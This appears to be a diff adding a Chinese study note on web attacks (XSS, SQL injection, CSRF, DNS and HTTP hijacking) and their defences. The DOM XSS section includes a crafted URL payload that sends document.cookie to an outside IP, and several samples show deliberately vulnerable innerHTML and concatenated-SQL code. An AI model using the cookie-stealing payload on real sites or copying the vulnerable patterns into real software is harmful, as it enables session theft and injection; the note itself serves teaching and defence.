@@ -1,0 +1,308 @@
+## 攻击手段
+
+Web 应用的攻击方式多种多样，通常的攻击方式包括脚本攻击和网络劫持。
+
+#### 脚本攻击
+
+> mutation n. 突变；变化
+
+脚本攻击常见的有 XSS、SQL 注入和 CSRF。
+
+##### XSS
+
+XSS，Cross-site Scripting，跨站脚本，带有页面可解析内容的数据未经处理直接插入到页面上解析导致的攻击。根据攻击脚本的引入位置，XSS 分为存储型 XSS、反射型 XSS 和突变型 XSS（MXSS）：
+
+* 存储型 XSS：前端提交的数据在未经处理的情况下，**持久化存储**到服务器文件或数据库，之后前端从服务端读取又直接插入到页面导致
+
+  ```
+  <!-- 未经处理存储数据直接插入到页面 -->
+  <div>{{ content }}</div>
+  
+  <!-- 存储内容是可解析脚本，渲染后的内容输出 -->
+  <div><script>alert();</script></div>
+  ```
+
+* 反射型 XSS：服务端直接从请求页面 URL 中不合法内容，未加处理的**直接反射回响应**中，导致攻击代码在客户端执行
+
+  ```
+  <!-- Node服务直接读取URL参数并渲染要页面 -->
+  let name = req.query['name'];
+  this.body = `<div>${name}</div>`;
+  
+  <!-- 如果URL参数是脚本，则得到的页面内容 -->
+  <div><script>alert();</script></div>
+  ```
+
+* MXSS：Mutation-based Cross-Site Scripting，又称 DOM XSS，页面渲染时攻击数据进入 DOM 后发生突变导致的攻击，通常是由于使用 innerHTML 导致。**常见的攻击场景是：用户输入数据或 URL 参数值被未加检测地 innerHTML 到页面 DOM 中，所以，在使用 innerHTML 时一定要提醒自己是否需要对插入数据进行校验！**
+
+  > Mutation，/mjuː'teɪʃ(ə)n/ n. [遗] 突变；变化；
+
+  ```
+  <!-- 页面元素渲染时含有可解析标签 -->
+  <p class="class-a {{b}}"></p>
+  
+  <!-- 插入恶意脚本内容后的输出 -->
+  <p class="class-a "><script>alert();</script><p class="class-b"></p>
+  ```
+
+  再例如，移动端通常使用 URL 参数携带图片链接，然后在新页面显示一张图片以利用长按保存功能
+
+  ```
+  <!-- URL链接 -->
+  https://a.com?img=https%3A%2F%2Fa.com%2Fimg.jpg"%20onclick="confirm(location.href=%27http://10.33.82.163/?id=%27%20+%20document.cookie)
+  
+  <!-- 获取img参数后innerHTML -->
+  let match = url.match(/img=([^&$]*)/);
+  let $poster = document.getElementById('poster');
+  
+  if (match) {
+  	$poster.innerHTML = '<img src="' + decodeURIComponent(match[1]) + '"/>';
+  }
+  
+  <!-- DOM结构，点击图片会携带Cookie到指定href -->
+  ...
+  <div id="poster">
+      <img src="https://a.com/img.jpg" 
+      	onclick="confirm(location.href='http://10.33.82.163/?id=' + document.cookie)">
+  </div>
+  ...
+  ```
+
+###### 措施
+
+**第一种方式是**严格验证页面上所有的输入内容，并做必要的转义。
+
+```
+// HTML字符转义编码
+function htmlEncode(str) {
+    if (str.length === 0) {
+        return;
+    }
+
+    str = str.replace(/&/g, '&amp;');
+    str = str.replace(/</g, '&lt;');
+    str = str.replace(/>/g, '&gt;');
+    str = str.replace(/ /g, '&nbsp;');
+    str = str.replace(/\'/g, '&#39;');
+    str = str.replace(/\"/g, '&quot;');
+    str = str.replace(/\n/g, '<br>');
+
+    return str;
+}
+
+// HTML字符转义解码
+function htmlDecode(str) {
+    if (str.length === 0) {
+        return;
+    }
+
+    str = str.replace(/&amp;/g, '&');
+    str = str.replace(/&lt;/g, '<');
+    str = str.replace(/&gt;/g, '>');
+    str = str.replace(/&nbsp;/g, ' ');
+    str = str.replace(/&#39;/g, '\'');
+    str = str.replace(/&quot;/g, '\"');
+    str = str.replace(/<br>/g, '\\n');
+
+    return str;
+}
+```
+
+经过转义编码后的特殊字符可以正常显示，但是不会被解析器解析。
+
+**第二种方式是**设置 X-XSS-Protection 消息头促使浏览器开启 XSS 过滤功能。设定之后，如果浏览器侦测到 XSS 攻击，会根据设置的属性做出相应的反应。**注意：**这个是旧有属性，基本上可以被 Content-Security-Policy 取代，但是还是可以为那些没有支持 Content-Security-Policy 的浏览器提供一层保护。
+
+X-XSS-Protection 有以下四个值可以设定
+
+* 0，关闭 XSS 过滤功能
+* 1，开启 XSS 过滤功能，如果侦测到 XSS 攻击的话，浏览器会删除不安全的部分
+* 1; mode=block，开启 XSS 过滤功能，如果侦测到 XSS 攻击的话，浏览器不会把网页给渲染出来
+* 1;report=\<uri>，开启 XSS 过滤功能，如果侦测到 XSS 攻击的话，浏览器会回报到指定的 URI
+
+Node.js 设置方式：
+
+```
+res.setHeader('X-XSS-Protection', '0')
+res.setHeader('X-XSS-Protection', '1')
+res.setHeader('X-XSS-Protection', '1;mode=block')
+res.setHeader('X-XSS-Protection', '1;report=https://www.example.com')
+```
+
+**第三种方式是**设置 Content-Security-Policy 消息头。CSP 指定浏览器只能加载指定域名来源的内容，这些内容可以是图片、iframe、font、style、脚本等远程资源。
+
+CSP设置方法具体参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid)，常用的设定有 default-src、script-src、img-src、font-src、frame-src 等
+
+例如，Node.js 设置方式：
+
+```
+res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' *.google.com 'unsafe-eval'; img-src 'self' *.amazonaws.com data:")
+```
+
+其中：
+
+* default-src ‘self’ 代表网站 resource 只能读取自己网站的，default 代表如果在其他设置栏位没找到的话，会根据 default-src 为主
+* script-src ‘self’ .google.com ‘unsafe-eval’  代表页面的 script src 可以存取自己网站以及 .google.com 域下脚本，以及可以允许 eval
+* img-src ‘self’ .amazonaws.com data 代表页面使用用的img src 可以存取自己网站以及 .amazonaws.com 底下，以及比较特别的是可以存取 base64 格式的 image data
+
+##### SQL 注入
+
+SQL 注入攻击，SQL injection，在页面提交数据到数据库后，服务端未进行数据验证即将其拼接进 SQL 语句中执行导致的攻击。
+
+例如：
+
+```
+let id = req.query['id'];
+let sql = `select * from user_table where id=${id}`;
+let data = exec(sql);
+
+this.body = data;
+```
+
+###### 原因
+
+可能导致 SQL 注入攻击的原因有：
+
+* 在应用程序中使用字符串联结方式或联合查询方式组合 SQL 指令
+* 在应用程序连接数据库时使用权限过大的账户
+* 在数据库中开放了不必要但权力过大的功能
+* 太过于信任用户所输入的数据，未限制输入的特殊字符，以及未对用户输入的数据做潜在指令的检查
+
+###### 措施
+
+主要的防范措施是对前端提交到服务端的数据进行严格的检查校验。
+
+###### 参考
+
+* 《现代前端技术解析》
+* 维基百科 - SQL注入攻击
+
+##### CSRF
+
+> forgery /'fɔrdʒəri/，n. 伪造；伪造罪；伪造物
+
+CSRF，Cross-site request forgery，跨站请求伪造，非源站点按照源站点数据请求格式，提交非法数据给源站点服务器的一种攻击方法。
+
+通常的场景是：非源站点在获取用户登录信息的前提下，然后包装请求数据和用户登录信息对源站点进行请求，如果源站点未对非源站点提交数据进行验证，该请求就可能成功执行。
+
+###### 示例
+
+受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求：
+
+```
+ http://bank.example/withdraw?account=bob&amount=1000000&for=bob2
+```
+
+可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。
+
+黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：
+
+```
+http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory
+```
+
+但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码：
+
+```
+ src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory”
+```
+
+并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。
+
+###### 措施
+
+CSRF 攻击之所以能够成功，是因为请求中所有的用户验证信息都是存在于 Cookie 中。要抵御 CSRF，需要在请求中放入不存在于 Cookie 中的不可伪造信息
+
+目前的策略主要有三种：
+
+- 验证 HTTP Referer 字段
+
+  该方案依赖浏览器实现，并非万无一失
+
+- 在请求参数中添加 token 并验证
+
+  可以在 HTTP 请求中以参数的形式加入一个随机产生的短时效性的 token，即便黑客获取了用户 Cookie，但是因为没有正确的 token，同样无法通过源站点验证
+
+- 在 HTTP 中自定义首部并验证
+
+  在使用 XMLHttpRequest 请求时，把自定义首部放到 HTTP 请求首部信息中。这种方法局限性比较大，因为 XMLHttpRequest 请求主要用于 Ajax 中，并非所有的请求都用 Ajax 发起
+
+
+###### 参考
+
+- [维基百科](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
+- [CSRF 攻击的应对之道](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)
+
+#### 网络劫持
+
+网络劫持一般指网络请求过程中因人为攻击导致没有加载到预期内容。网络劫持主要有 DNS 劫持和 HTTP 劫持。
+
+##### DNS 劫持
+
+DNS 劫持指攻击者劫持 DNS 服务器，并获得域名解析控制权，导致正确的网址不能解析或被解析到错误的 IP，最终破坏原有网站正常服务，甚至获取用户资料。
+
+##### HTTP 劫持
+
+HTTP 劫持指在客户端与服务器之间建立的网络数据传输通道中，从网关或防火墙层上监视数据信息，当满足条件时，修改数据包使客户端解释错误的数据，最终导致网站异常，比如，以弹窗形式在客户端展示广告或其它内容。
+
+##### 防范措施
+
+###### HTTPS
+
+HTTPS 协议下，传输层传输的内容不会以明文的方式显示，而且 HTTPS 请求只能被添加了对应数字证书的应用层代理拦截，第三方攻击者就无计可施了。
+
+具体流程参见《95-深入理解之TCPIP》
+
+###### Strict-Transport-Security
+
+STS，强化 HTTPS 机制的一种方式，它告诉浏览器只能通过 HTTPS 协议访问当前资源。
+
+**需要注意的是：**
+
+* STS 在通过 HTTP 访问时会被浏览器忽略，因为攻击者可以通过中间人攻击的方式在连接中注入、修改或删除它。只有通过 HTTPS 访问并且没有证书错误时，浏览器才认为网站支持 HTTPS，然后使用 STS 的值。
+
+语法：
+
+```
+Strict-Transport-Security: max-age=<expire-time>
+Strict-Transport-Security: max-age=<expire-time>; includeSubDomains
+```
+
+其中，
+
+- max-age=\<expire-time\> 表示浏览器在 \<expire-time\> 时间内凡是访问域名下的请求皆使用 HTTPS 请求
+- includeSubDomains，说明此规则也适用于该网站的所有子域名
+
+Node.js 设置方式：
+
+```
+res.setHeader('Strict-Transport-Security', 'max-age=16070400; includeSubDomains')
+```
+
+###### Access-Control-Allow-Origin
+
+Access-Control-Allow-Origin 是从 CORS 中分离出来的，该响应头指定允许访问相应资源的域名。
+
+语法：
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: <origin>
+```
+
+其中：
+
+* \* 允许所有域都可以访问相应资源
+* \<origin\> 指定可以访问资源的域名
+
+#### 参考
+
+* https://yu-jack.github.io/2017/10/20/secure-header/
+
+
+
+
+
+
+
+
+
